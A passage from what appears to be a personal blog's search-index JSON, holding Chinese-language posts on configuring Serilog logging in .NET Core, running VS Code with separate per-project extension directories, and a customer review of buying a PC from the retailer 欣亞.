.AddJsonFile(\"appsettings.json\") .AddJsonFile($\"appsettings.{Environment.GetEnvironmentVariable(\"ASPNETCORE_ENVIRONMENT\") ?? \"Production\"}.json\", true) .Build(); Log.Logger = new LoggerConfiguration() .ReadFrom.Configuration(configuration) .CreateLogger(); #regionend 這邊 try { Log.Information(\"Starting web host\"); CreateHostBuilder(args).Build().Run(); return 0; } catch (Exception ex) { Log.Fatal(ex, \"Host terminated unexpectedly\"); return 1; } finally { Log.CloseAndFlush(); } } public static IHostBuilder CreateHostBuilder(string[] args) =\u003e Host.CreateDefaultBuilder(args) .UseSerilog() .ConfigureWebHostDefaults(webBuilder =\u003e { webBuilder.UseStartup\u003cStartup\u003e(); }); } ","date":"2023-02-19","objectID":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/:2:0","tags":[".netcore","serilog","log"],"title":".Net Core 加上 Serillog","uri":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/"},{"categories":[".Net Core"],"content":"log 格式 可以參考:Formatting Output · serilog/serilog Wiki ","date":"2023-02-19","objectID":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/:3:0","tags":[".netcore","serilog","log"],"title":".Net Core 加上 Serillog","uri":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/"},{"categories":[".Net Core"],"content":"短格式補時間 [{Timestamp:HH:mm:ss} {Level:u3}] {Message:lj}{NewLine}{Exception} [22:59:49 INF] Request finished HTTP/1.1 GET http://localhost:5000/weatherforecast - - - 405 0 - 206.1174ms ","date":"2023-02-19","objectID":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/:3:1","tags":[".netcore","serilog","log"],"title":".Net Core 加上 Serillog","uri":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/"},{"categories":[".Net Core"],"content":"長格式 {Timestamp:yyyy-MM-dd HH:mm:ss.fff zzz} [{Level}] ({SourceContext}.{Method}) {Message}{NewLine}{Exception} 2022-07-03 23:03:35.144 +08:00 [Information] (Microsoft.AspNetCore.Hosting.Diagnostics.GET) Request finished HTTP/1.1 GET http://localhost:5000/weatherforecast - - - 405 0 - 173.3515ms 2022-07-03 23:03:38.188 +08:00 [Information] (Microsoft.Hosting.Lifetime.) Application is shutting down... ","date":"2023-02-19","objectID":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/:3:2","tags":[".netcore","serilog","log"],"title":".Net Core 加上 Serillog","uri":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/"},{"categories":[".Net Core"],"content":"Console 標示哪知 class 錯誤 \"WriteTo\": [ { \"Name\": \"Console\", \"Args\": { \"theme\": \"Serilog.Sinks.SystemConsole.Themes.AnsiConsoleTheme::Code, Serilog.Sinks.Console\", \"outputTemplate\": \"[{Timestamp:HH:mm:ss} {Level:u3}] {Message:lj} \u003cs:{SourceContext}\u003e{NewLine}{Exception}\" } 參考官網:serilog/serilog-sinks-console: Write log events to System.Console as text or JSON, with ANSI theme support ","date":"2023-02-19","objectID":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/:3:3","tags":[".netcore","serilog","log"],"title":".Net Core 加上 Serillog","uri":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/"},{"categories":[".Net Core"],"content":"我調整格式 {Timestamp:HH:mm:ss} [{Level:u3}] ({SourceContext}.{Method}) {Message}{NewLine}{Exception} ","date":"2023-02-19","objectID":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/:3:4","tags":[".netcore","serilog","log"],"title":".Net Core 加上 Serillog","uri":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/"},{"categories":[".Net Core"],"content":"效能注意 Writing Log Events · serilog/serilog Wiki readonly bool _isDebug = Log.IsEnabled(LogEventLevel.Debug); ... if (_isDebug) Log.Debug(\"Someone is stuck debugging...\"); ","date":"2023-02-19","objectID":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/:4:0","tags":[".netcore","serilog","log"],"title":".Net Core 加上 Serillog","uri":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/"},{"categories":[".Net Core"],"content":"log存到資料庫上 參考:Database Logging with Serilog in an ASP.NET Core Application ","date":"2023-02-19","objectID":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/:5:0","tags":[".netcore","serilog","log"],"title":".Net Core 加上 Serillog","uri":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/"},{"categories":[".Net Core"],"content":"刪除舊檔案 參考:c# - How do I automatically tail (delete) older logs using Serilog in a .Net WPF application? - Stack Overflow ","date":"2023-02-19","objectID":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/:6:0","tags":[".netcore","serilog","log"],"title":".Net Core 加上 Serillog","uri":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/"},{"categories":[".Net Core"],"content":"默認 31天會刪除檔案 For the same reason, only the most recent 31 files are retained by default (i.e. one long month). To change or remove this limit, pass the retainedFileCountLimit parameter. .WriteTo.File(\"log.txt\", rollingInterval: RollingInterval.Day, retainedFileCountLimit: null) ","date":"2023-02-19","objectID":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/:7:0","tags":[".netcore","serilog","log"],"title":".Net Core 加上 Serillog","uri":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/"},{"categories":[".Net Core"],"content":"補上 Request Id 網路上針對加 Request Id 都是對 JSON Log 方式，仔細想想這種搜尋對 JSON 是方便的，但不是每個公司都有 ELK 工具當作 log 使用，這邊查有沒有用純 log 方式去紀錄 Request Id，所幸看到這篇ASP.NET Core Logging Solution - Run2948 - 博客园 備份圖。 The template used for formatting plain text log output. The default is {Timestamp:o} {RequestId,13} [{Level:u3}] {Message} ({EventId:x8}){NewLine}{Exception} 只要在 OutputTemplate 補上 {RequestID} 就可以了。 要轉成 JSON 方式可以參考.NET 6.0 如何使用 Serilog 對應用程式事件進行結構化紀錄 | The Will Will Web。 ","date":"2023-02-19","objectID":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/:8:0","tags":[".netcore","serilog","log"],"title":".Net Core 加上 Serillog","uri":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/"},{"categories":[".Net Core"],"content":"相關知識 預設 Level 為 Information。 寫格式注意的事情。 ","date":"2023-02-19","objectID":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/:9:0","tags":[".netcore","serilog","log"],"title":".Net Core 加上 Serillog","uri":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/"},{"categories":[".Net Core"],"content":"結構化處理 [NETCore] 結構化日誌 Serilog - Events Types 和 Enrichment ~ m@rcus 學習筆記 ","date":"2023-02-19","objectID":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/:10:0","tags":[".netcore","serilog","log"],"title":".Net Core 加上 Serillog","uri":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/"},{"categories":[".Net Core"],"content":"存在 SQL Server serilog-mssql/serilog-sinks-mssqlserver: A Serilog sink that writes events to Microsoft SQL Server and Azure SQL 雖然分散式架構可以用這個集中log，但我認為這個不是最佳解。不過我們公司有再用，有空簡單嘗試。 ","date":"2023-02-19","objectID":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/:11:0","tags":[".netcore","serilog","log"],"title":".Net Core 加上 Serillog","uri":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/"},{"categories":[".Net Core"],"content":"壓縮舊 log cocowalla/serilog-sinks-file-archive: Plugin for the Serilog File sink that works with rolling log files, archiving completed log files before they are deleted by Serilog’s retention mechanism 有空嘗試。 ","date":"2023-02-19","objectID":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/:12:0","tags":[".netcore","serilog","log"],"title":".Net Core 加上 Serillog","uri":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/"},{"categories":[".Net Core"],"content":"相關文章 【Abp VNext】实战入门（三）：【3】控制台应用程序 —— Seriallog日志记录_liuyonghong159632的博客-CSDN博客_abpvnext 日志 [NETCore] 結構化日誌 Serilog - 配置設定 ~ m@rcus 學習筆記 如何在 ASP.Net Core 中使用 Serilog | IT人 將 ASP.NET Core 的預設 log 輸出至 NLog 或 Serilog - Yowko’s Notes ","date":"2023-02-19","objectID":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/:13:0","tags":[".netcore","serilog","log"],"title":".Net Core 加上 Serillog","uri":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/"},{"categories":[".Net Core"],"content":"詳細範例 .NET 6.0 如何使用 Serilog 對應用程式事件進行結構化紀錄 | The Will Will Web Serilog 2.10 中文文档_JimCarter的博客-CSDN博客_serilog中文文档 .net core 使用 Serilog 作为日志提供者 - IWing - 博客园 乘风破浪，遇见最佳跨平台跨终端框架.Net Core/.Net生态 - 浅析ASP.NET Core日志框架，通过Serilog来记录结构化日志 - TaylorShi - 博客园 ","date":"2023-02-19","objectID":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/:13:1","tags":[".netcore","serilog","log"],"title":".Net Core 加上 Serillog","uri":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/"},{"categories":[".Net Core"],"content":"彩蛋 Seq — centralized structured logs for . NET, Java, Node.js ","date":"2023-02-19","objectID":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/:14:0","tags":[".netcore","serilog","log"],"title":".Net Core 加上 Serillog","uri":"/blog/posts/Net-Core-%E5%8A%A0%E4%B8%8A-Serillog/"},{"categories":["實用工具"],"content":"我們工程師有時候會寫前端、後端程式，相關裝的套件會不太一樣。像是以前寫 Java 開發的設定會不一樣，我們會複製多個 Eclipse 依照專案做設定和安裝套件，但是 Visual Studio Code 是針對 User使用者帳號，在管理上我們不太可能切換帳號。這邊有找到方法試試。 ","date":"2023-02-19","objectID":"/blog/posts/Visual-Studio-Code-%E5%9C%A8%E4%B8%8D%E5%90%8C%E5%B0%88%E6%A1%88%E4%B8%8A%E8%A3%9D%E4%B8%8A%E5%90%84%E8%87%AA%E5%A5%97%E4%BB%B6-Extension/:0:0","tags":["vscode","extension"],"title":"Visual Studio Code 在不同專案上裝上各自套件 Extension","uri":"/blog/posts/Visual-Studio-Code-%E5%9C%A8%E4%B8%8D%E5%90%8C%E5%B0%88%E6%A1%88%E4%B8%8A%E8%A3%9D%E4%B8%8A%E5%90%84%E8%87%AA%E5%A5%97%E4%BB%B6-Extension/"},{"categories":["實用工具"],"content":"指令啟動指定套件路徑 Extensions 的安裝路徑 Windows: %USERPROFILE%.vscode\\extensions Mac: ~/.vscode/extensions Linux: ~/.vscode/extensions 管理或分享 vs code 的 workspace extensions | Codefun \u003c– 但裡面方法不是這邊使用方法 之前有看到有篇 StackOverflow 設定捷徑啟動設定 extension 路徑，這樣就能分開前後端開發用，但有找到相關分離 VS Code 開發環境. VS… | by Coding Notes | Medium文章，這邊簡單參考這篇文章實作。 ","date":"2023-02-19","objectID":"/blog/posts/Visual-Studio-Code-%E5%9C%A8%E4%B8%8D%E5%90%8C%E5%B0%88%E6%A1%88%E4%B8%8A%E8%A3%9D%E4%B8%8A%E5%90%84%E8%87%AA%E5%A5%97%E4%BB%B6-Extension/:1:0","tags":["vscode","extension"],"title":"Visual Studio Code 在不同專案上裝上各自套件 Extension","uri":"/blog/posts/Visual-Studio-Code-%E5%9C%A8%E4%B8%8D%E5%90%8C%E5%B0%88%E6%A1%88%E4%B8%8A%E8%A3%9D%E4%B8%8A%E5%90%84%E8%87%AA%E5%A5%97%E4%BB%B6-Extension/"},{"categories":["實用工具"],"content":"建立各環境路徑 # 在家路徑操作 mkdir vs-java cd vs-java mkdir extensions mkdir settings cd .. mkdir vs-vue cd vs-vue mkdir extensions mkdir settings code --extensions-dir ~/vs-java/extensions --user-data-dir ~/vs-java/settings code --extensions-dir ~/vs-vue/extensions --user-data-dir ~/vs-vue/settings Warning 這邊要注意，~不能在 cmd使用，~是家路徑。這邊用 Powershell 就沒有這個問題。如果你照複製做也不會發生錯誤，頂多一個~路徑。 Windows 可以複製捷徑設定\"C:\\Users\\__username__\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe\" --extensions-dir %USERPROFILE%/~/vs-java/extensions --user-data-dir %USERPROFILE%/~/vs-java/settings路徑。 ","date":"2023-02-19","objectID":"/blog/posts/Visual-Studio-Code-%E5%9C%A8%E4%B8%8D%E5%90%8C%E5%B0%88%E6%A1%88%E4%B8%8A%E8%A3%9D%E4%B8%8A%E5%90%84%E8%87%AA%E5%A5%97%E4%BB%B6-Extension/:1:1","tags":["vscode","extension"],"title":"Visual Studio Code 在不同專案上裝上各自套件 Extension","uri":"/blog/posts/Visual-Studio-Code-%E5%9C%A8%E4%B8%8D%E5%90%8C%E5%B0%88%E6%A1%88%E4%B8%8A%E8%A3%9D%E4%B8%8A%E5%90%84%E8%87%AA%E5%A5%97%E4%BB%B6-Extension/"},{"categories":["實用工具"],"content":"依照 Workspace 設定套件 ","date":"2023-02-19","objectID":"/blog/posts/Visual-Studio-Code-%E5%9C%A8%E4%B8%8D%E5%90%8C%E5%B0%88%E6%A1%88%E4%B8%8A%E8%A3%9D%E4%B8%8A%E5%90%84%E8%87%AA%E5%A5%97%E4%BB%B6-Extension/:2:0","tags":["vscode","extension"],"title":"Visual Studio Code 在不同專案上裝上各自套件 Extension","uri":"/blog/posts/Visual-Studio-Code-%E5%9C%A8%E4%B8%8D%E5%90%8C%E5%B0%88%E6%A1%88%E4%B8%8A%E8%A3%9D%E4%B8%8A%E5%90%84%E8%87%AA%E5%A5%97%E4%BB%B6-Extension/"},{"categories":["實用工具"],"content":"了解 Workspace 是什麼? 一般我常使用 Folder 去開 VSCode，這邊也對 Workspace也有模糊概念。這篇VSCode裡面的folder、workspace什麼區別？ - 知乎就有很多對VSCode看法。 一般來說，一個項目包含多個檔案和資料夾，因此應該選擇Open Folder而WorkSpace個人理解是用於打開多個項目時用。比如我要做一個網站，前端後端一起偵錯的時候，可以同時開兩個VS Code，也可以將這兩個項目的資料夾加入到一個WorkSpace裡。合到一個WorkSpace在開發時可以更聚焦於程式碼，而不是頻繁切換窗口。 作者：OhYee 链接：https://www.zhihu.com/question/354019992/answer/881192654 来源：知乎 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 ","date":"2023-02-19","objectID":"/blog/posts/Visual-Studio-Code-%E5%9C%A8%E4%B8%8D%E5%90%8C%E5%B0%88%E6%A1%88%E4%B8%8A%E8%A3%9D%E4%B8%8A%E5%90%84%E8%87%AA%E5%A5%97%E4%BB%B6-Extension/:2:1","tags":["vscode","extension"],"title":"Visual Studio Code 在不同專案上裝上各自套件 Extension","uri":"/blog/posts/Visual-Studio-Code-%E5%9C%A8%E4%B8%8D%E5%90%8C%E5%B0%88%E6%A1%88%E4%B8%8A%E8%A3%9D%E4%B8%8A%E5%90%84%E8%87%AA%E5%A5%97%E4%BB%B6-Extension/"},{"categories":["實用工具"],"content":"實作 參考管理或分享 vs code 的 workspace extensions | Codefun，這邊主要改成手動 GUI 新增套件，這邊發現他預設裝只能對全域安裝在調整工作區。 補充管理或分享 vs code 的 workspace extensions | Codefun教學也可以這樣新增到extension.json。 其實我還不太了解為什麼要在工作區做Recommended Extensions，除了可以快速點選安裝外，我想不到什麼好處，畢竟也是要手動安裝… 這邊也有快速搜尋有什麼Recommended Extensions，只要搜尋打@recommended就能列出清單。 切換/關閉工作區也讓我想很久，爬文一下有找到答案。 切換: Ctrl + R 關閉: Ctrl + K AND F 也要評估工作區是要放在哪邊，可能要放在專案跟根目錄會比較好找。 ","date":"2023-02-19","objectID":"/blog/posts/Visual-Studio-Code-%E5%9C%A8%E4%B8%8D%E5%90%8C%E5%B0%88%E6%A1%88%E4%B8%8A%E8%A3%9D%E4%B8%8A%E5%90%84%E8%87%AA%E5%A5%97%E4%BB%B6-Extension/:2:2","tags":["vscode","extension"],"title":"Visual Studio Code 在不同專案上裝上各自套件 Extension","uri":"/blog/posts/Visual-Studio-Code-%E5%9C%A8%E4%B8%8D%E5%90%8C%E5%B0%88%E6%A1%88%E4%B8%8A%E8%A3%9D%E4%B8%8A%E5%90%84%E8%87%AA%E5%A5%97%E4%BB%B6-Extension/"},{"categories":["實用工具"],"content":"總結 有兩個方法都各有優缺點，看使用者喜歡集中式管理還是分散管理，我認為第一個方式是最簡單的，容易操作不會出現問題。第二個集中式管理最後套件越裝越多，後期管理套件上不是非常方便，但是相對也不會儲存到多的空間。 要我選的話，我會選第一個比較直覺。 ","date":"2023-02-19","objectID":"/blog/posts/Visual-Studio-Code-%E5%9C%A8%E4%B8%8D%E5%90%8C%E5%B0%88%E6%A1%88%E4%B8%8A%E8%A3%9D%E4%B8%8A%E5%90%84%E8%87%AA%E5%A5%97%E4%BB%B6-Extension/:3:0","tags":["vscode","extension"],"title":"Visual Studio Code 在不同專案上裝上各自套件 Extension","uri":"/blog/posts/Visual-Studio-Code-%E5%9C%A8%E4%B8%8D%E5%90%8C%E5%B0%88%E6%A1%88%E4%B8%8A%E8%A3%9D%E4%B8%8A%E5%90%84%E8%87%AA%E5%A5%97%E4%BB%B6-Extension/"},{"categories":["實用工具"],"content":"彩蛋 The Visual Studio Code command-line interface ","date":"2023-02-19","objectID":"/blog/posts/Visual-Studio-Code-%E5%9C%A8%E4%B8%8D%E5%90%8C%E5%B0%88%E6%A1%88%E4%B8%8A%E8%A3%9D%E4%B8%8A%E5%90%84%E8%87%AA%E5%A5%97%E4%BB%B6-Extension/:4:0","tags":["vscode","extension"],"title":"Visual Studio Code 在不同專案上裝上各自套件 Extension","uri":"/blog/posts/Visual-Studio-Code-%E5%9C%A8%E4%B8%8D%E5%90%8C%E5%B0%88%E6%A1%88%E4%B8%8A%E8%A3%9D%E4%B8%8A%E5%90%84%E8%87%AA%E5%A5%97%E4%BB%B6-Extension/"},{"categories":["隨意開箱"],"content":"舊電腦用了8年前，最近朋友看到記憶體有下降，電腦也用了一陣子，是可以換電腦了。這邊特別紀錄 2023 年在欣亞購買電腦心得，順便紀錄購買電腦需要注意的事情。 ","date":"2023-02-18","objectID":"/blog/posts/2023%E5%B9%B4%E6%AC%A3%E4%BA%9E%E9%9B%BB%E8%85%A6%E8%B3%BC%E8%B2%B7%E8%A8%98/:0:0","tags":["pc"],"title":"2023年欣亞電腦購買記","uri":"/blog/posts/2023%E5%B9%B4%E6%AC%A3%E4%BA%9E%E9%9B%BB%E8%85%A6%E8%B3%BC%E8%B2%B7%E8%A8%98/"},{"categories":["隨意開箱"],"content":"新電腦配備 商品清單: 中央處理器 Intel【16核】Core i7-13700K 16C24T/3.4GHz(Turbo 5.4GHz)/快取30M/UHD770/125W【代理公司貨】 * 1 主機板 微星 PRO Z790-P WIFI(ATX/1H1P/Intel 2.5Gb/Wi-Fi 6E+BT 5.3/註冊四年保) * 1 RAM 記憶體 美光 Crucial DDR5-5200 32G(CL42/內建PMIC電源管理晶片/支援XMP3.0功能) * 2 HDD 機械硬碟 WD 藍標 2TB(WD20EZBX) 7200轉/SATA3/256MB/三年保固 1 SSD 固態硬碟 金士頓 Kingston FURY Renegade 1TB/M.2 PCIe Gen4/讀:7300M/寫:6000M/TLC/五年保 * 2 電源供應器(CP促銷)/不斷電系統 振華 Leadex III Gold 750W(80+金牌/ATX/全模組/七年保固) * 1 電腦機殼(散熱器促銷) Antec 安鈦克 P101 Silent 黑 靜音機殼 黑 (E-ATX/內建風扇前3後1/顯卡450mm/塔散180mm/水冷360mm) * 1 估價單參考:欣亞數位-估價單-1675516208，請注意是不是有漏商品。 記憶體是買美光 DDR5 32GB * 2 5200Mhz，那時候沒貨自己買，顯示卡沿用舊的 GTX-2060。機殼還滿重的，當初買沒有注意到。 ","date":"2023-02-18","objectID":"/blog/posts/2023%E5%B9%B4%E6%AC%A3%E4%BA%9E%E9%9B%BB%E8%85%A6%E8%B3%BC%E8%B2%B7%E8%A8%98/:0:1","tags":["pc"],"title":"2023年欣亞電腦購買記","uri":"/blog/posts/2023%E5%B9%B4%E6%AC%A3%E4%BA%9E%E9%9B%BB%E8%85%A6%E8%B3%BC%E8%B2%B7%E8%A8%98/"},{"categories":["隨意開箱"],"content":"舊電腦配備 ","date":"2023-02-18","objectID":"/blog/posts/2023%E5%B9%B4%E6%AC%A3%E4%BA%9E%E9%9B%BB%E8%85%A6%E8%B3%BC%E8%B2%B7%E8%A8%98/:0:2","tags":["pc"],"title":"2023年欣亞電腦購買記","uri":"/blog/posts/2023%E5%B9%B4%E6%AC%A3%E4%BA%9E%E9%9B%BB%E8%85%A6%E8%B3%BC%E8%B2%B7%E8%A8%98/"},{"categories":["隨意開箱"],"content":"安裝筆記 舊電腦移轉 Windows 授權問題，目前打算灌 Windows 11，最後測試有移轉成功。 可以參考下面教學: 【客戶詢問】舊電腦的微軟帳戶已經綁定一套win10授權，現在舊電腦不用了，這套win10授權可以在新電腦上啟用嗎？ @ 歐飛先生 :: 痞客邦 :: 【問題】想請問組新電腦，作業系統轉移相關問題 win10\u003ewin11 @電腦應用綜合討論 哈啦板 - 巴哈姆特 ","date":"2023-02-18","objectID":"/blog/posts/2023%E5%B9%B4%E6%AC%A3%E4%BA%9E%E9%9B%BB%E8%85%A6%E8%B3%BC%E8%B2%B7%E8%A8%98/:1:0","tags":["pc"],"title":"2023年欣亞電腦購買記","uri":"/blog/posts/2023%E5%B9%B4%E6%AC%A3%E4%BA%9E%E9%9B%BB%E8%85%A6%E8%B3%BC%E8%B2%B7%E8%A8%98/"},{"categories":["隨意開箱"],"content":"購買注意心得 塔散(空冷)不適合寄送 可以看下這篇【問題】塔扇看起來斜斜的,這樣真的沒問題嗎? @電腦應用綜合討論 哈啦板 - 巴哈姆特，重點1樓和4樓。 建議自取比較安全，我買完後才看到這個…。 但看到4樓欣亞會用緩衝材，看到這個我是有鬆一口氣，不過過好幾天怕怕的，商品又是從台中來的更怕。 結果沒有用緩衝材…，不知道是中部(彰化)店家不會用??不過還好我東西是沒壞掉。 之前上一家電腦沒買風冷，所以原價屋購買那一次沒有這個問題。 塔散(空冷)會擋住記憶體 風冷拿掉就可以插 4 條記憶體，原本很怕插記憶還要拔風冷。 拔開顯示卡注意事情 之前顯示卡有讓我的主板卡榫壞掉，現在顯卡和空冷都做兩麼大，這邊可能需要用工具才比較好拔顯卡，可以參考下面影片。 (31) 藤小二 2022年 電腦DIY組裝教學-如何拆裝電腦的中高階顯示卡? 工具-螺絲起子+一字起子。1.解開螺絲 2.主機板顯示卡卡榫往內壓 3.顯示卡往外拔出！(2022/3/24) - YouTube 欣亞插四條記憶體位置 這邊我朋友有拿到，這邊商家幫他放的記憶體位置順便記錄一下。 ","date":"2023-02-18","objectID":"/blog/posts/2023%E5%B9%B4%E6%AC%A3%E4%BA%9E%E9%9B%BB%E8%85%A6%E8%B3%BC%E8%B2%B7%E8%A8%98/:1:1","tags":["pc"],"title":"2023年欣亞電腦購買記","uri":"/blog/posts/2023%E5%B9%B4%E6%AC%A3%E4%BA%9E%E9%9B%BB%E8%85%A6%E8%B3%BC%E8%B2%B7%E8%A8%98/"},{"categories":["隨意開箱"],"content":"選擇欣亞 之前配電腦都在原價屋，朋友發現最近欣亞可以用信用卡分期付款，刷卡不加錢，但原價屋信用卡會多手續費，所以打算用用看這家。 ","date":"2023-02-18","objectID":"/blog/posts/2023%E5%B9%B4%E6%AC%A3%E4%BA%9E%E9%9B%BB%E8%85%A6%E8%B3%BC%E8%B2%B7%E8%A8%98/:1:2","tags":["pc"],"title":"2023年欣亞電腦購買記","uri":"/blog/posts/2023%E5%B9%B4%E6%AC%A3%E4%BA%9E%E9%9B%BB%E8%85%A6%E8%B3%BC%E8%B2%B7%E8%A8%98/"},{"categories":["隨意開箱"],"content":"購買欣亞小小抱怨 這邊不是在說欣亞不好，只是覺得這些改進。我會給欣亞滿分評價，只是這次購買體驗我只能給普通。但我朋友比我快拿到，他應該是沒有我這個問題，只能說我倒楣。 產生估價單商品會莫名其妙消失 他線上搜尋商品滿方便的，他也有類似原價屋分享商品功能，只要把網址貼給人家就能看到別人幫你選好商品。由於我朋友幫我建立「估價單」，節我我看的時候因為沒注意到記憶體消失，直接購買少買到記憶體… 由於原價屋估價單就算商品下架或缺貨，估價單就會劃掉。商品不會莫名其妙消失…，這點欣亞真的大大的扣分，害我漏買一個商品，在我朋友聊天比對發現我少買一片，不然我可能到貨都不知道吧。 我晚朋友一小時購買，他四天就能拿到了 我晚我朋友一小時購買(但有跨日)，因為他有車所以選店內自取，他四天就拿到商品。不知道是不是選店內領取會不會比較快，這邊下次購買可能會選取貨。 目前我九天才拿到電腦。(02-05 ~ 02-14)，扣除假日就七天。 出貨狀態不準確，貨品出貨狀態一直變變變 不知道是商城同步問題?這邊常常自己去追訂單進度，2/10商品商品運送中，我以為已經出貨了，原本想禮拜六、一可以拿到。此時訂單全統無法查到資料。 禮拜六我有打到全統去問禮拜日是否有送貨，能確定的事情是沒有的。因為假日說他們是值班的，所以無法查訂單資訊，這邊我跟他說商城貨品狀態，感覺他也是黑人問號。 禮拜一早上上班查看訂單狀態，這邊看到拒絕指派真的很黑人問號。因為早上有工作就沒先打電話課服問。 結果過一陣子狀態又變了。 這邊中午打電話給欣亞客服，他們那邊感覺可以看到詳細資料，他說我的商品還沒出貨，我滿吃驚，之前狀態是寫假的嗎???商品組裝是從彰化組的，我但我貨物追蹤寫內湖總公司，想說應該是台北記出，但客服人還算滿有耐心，這邊有說一下原因，禮拜五晚上九點組完，所以商品禮拜一才送出，因為他們商城有E化東西，東西是從不同門市寄出。參考下圖 Note: 假日原價屋和欣亞是打不進去的，平日打好像滿好打的。剛好因為跟我朋友同事買，都會截圖給他分享我現在狀態，順便可以寫這篇。 組裝電腦可能不是台北店家組的 2/13 打客服才知道商品不是從台北送出來的，希望不會遇到【問題】塔扇看起來斜斜的,這樣真的沒問題嗎? @電腦應用綜合討論 哈啦板 - 巴哈姆特問題。事後機器沒有事情。其實自取拿真的才是可控的，可能不差那個計程車錢，畢竟都買電腦了不差這一筆運費。 訂單明細 UI 介面放的怪怪的 商城購買商品需要注意信用卡填寫時間不能太長，我進入信用卡那頁再找信用卡，花了一些時間然後送出跳出購買失敗，不過我第二次購買就成功。去訂單區發現產生兩筆訂單，這邊就把第一筆取消了。正常我們在其他商城(PChome、Yahoo購物中心)點選訂單應該是看到購買清單，但是欣亞是已取消訂單是看到購買明細。但已夠買是看到已退貨清單，這邊讓我以為是購買商品明細。 取消訂單 購買成功訂單 我還以為我 M2 只買到一個，但價格還是 5000 多。後來我朋友發現左邊那個勾勾點下去，才能看到數量。 我還以為是訂單錯誤。原來是 UX 設計問題，**我點訂單是希望我退貨嗎?正常都是看購買資訊吧! ","date":"2023-02-18","objectID":"/blog/posts/2023%E5%B9%B4%E6%AC%A3%E4%BA%9E%E9%9B%BB%E8%85%A6%E8%B3%BC%E8%B2%B7%E8%A8%98/:1:3","tags":["pc"],"title":"2023年欣亞電腦購買記","uri":"/blog/posts/2023%E5%B9%B4%E6%AC%A3%E4%BA%9E%E9%9B%BB%E8%85%A6%E8%B3%BC%E8%B2%B7%E8%A8%98/"},{"categories":["隨意開箱"],"content":"建議改進 設置訂單處理燈(綠燈、黃燈) 我覺得商城可以用綠燈、黃燈可以讓消費者看現在是否購買狀態，畢竟事後買超出預期時間買家也不會高興。買之前知道訂單處理狀態的話，消費者應該都能接受。 出貨狀態應該是寄送，才能標註送貨狀態。 不知道是不是他們系統有問題?同步資料跟實際送貨時間不一致，能給上送貨狀態說明更好。不然看到拒絕派遣也是黑人問號。 至於 UX 那些就影響購買體驗這邊就不特別寫上，畢竟上面兩點真的影響很多購買體驗。第二次使用就不會有這個烏龍。 ","date":"2023-02-18","objectID":"/blog/posts/2023%E5%B9%B4%E6%AC%A3%E4%BA%9E%E9%9B%BB%E8%85%A6%E8%B3%BC%E8%B2%B7%E8%A8%98/:1:4","tags":["pc"],"title":"2023年欣亞電腦購買記","uri":"/blog/posts/2023%E5%B9%B4%E6%AC%A3%E4%BA%9E%E9%9B%BB%E8%85%A6%E8%B3%BC%E8%B2%B7%E8%A8%98/"},{"categories":["隨意開箱"],"content":"購買欣亞總結 欣亞雖然上面抱怨一些東西，但其實也沒到黑名單之類的，只是讓我覺得購買體驗非常差。有些 UX 功能設計並非主因。貨量慢可能是商家定家現在有很多單，所以超過他們所說的 5個工作天，老實說單子延遲的話，主動說會比較好，可以讓消費者不用自己去追單。電腦出貨狀態與實際出貨狀態不一致，容易造成消費者誤判時間，當發現電腦還沒出貨，這種心情更是難過，最後，電腦收到是好的比較重要 (現在寫這個還沒拿到)，希望不會遇到一些雷。 最後拿到沒事 我看這篇有提到原價屋和欣亞優缺點，【心得】欣亞 VS 原價屋，買東西買出氣來，來談談兩家店的優缺點 (抱怨文)(7/21更新) @電腦應用綜合討論 哈啦板 - 巴哈姆特，整理出來優缺點可以當參考，參考如下。 於是我整理了兩邊的優缺點 首先，我比較喜歡欣亞，只是欣亞剛好沒賣這個 欣亞的好處 可以刷信用卡不多收錢 FB 小編的回覆速度很快，馬上問什麼東西有沒有，很快會得到反應 欣亞的售後還沒出過問題 欣亞的壞處 遇過超賣，之前買顯卡，一開始都下好單了，也談好了，信用卡都刷了，最後收到一通電話說他們….講白了就是超賣，不過後面有補給我 組裝很慢，不過這是我幫朋友買的那次等特別久而已，不組可以很快拿到 